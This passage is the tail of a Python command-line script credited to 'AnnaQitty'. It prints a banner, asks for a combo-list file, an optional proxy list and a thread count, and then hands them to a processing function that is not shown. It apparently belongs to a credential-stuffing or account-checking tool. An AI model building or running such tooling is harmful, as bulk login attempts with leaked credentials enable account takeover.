    '╚╩╩╩═╩╩═╩╩╝╚═╩╝╚╝ ╚╝ ╚╝'
)
print(Fore.LIGHTGREEN_EX + banner + Style.RESET_ALL)
print(Fore.LIGHTGREEN_EX + ' By : AnnaQitty' + Style.RESET_ALL)

if __name__ == '__main__':
    try:
        file_path = input(Fore.RED + '+[+] ComboList : ' + Style.RESET_ALL).strip()
        proxy_file_path = input(Fore.LIGHTGREEN_EX + '+[+] ProxyList (optional) : ' + Style.RESET_ALL).strip()
        thread_user = input(Fore.LIGHTGREEN_EX + '+[+] Threads : ' + Style.RESET_ALL).strip()
        try:
            num_threads = int(thread_user)
        except ValueError:
            num_threads = 200

        process_file(file_path, proxy_file_path, num_threads)
    except KeyboardInterrupt:
        print(Fore.RED + '\nInterrupted by user.' + Style.RESET_ALL)
        sys.exit(0)
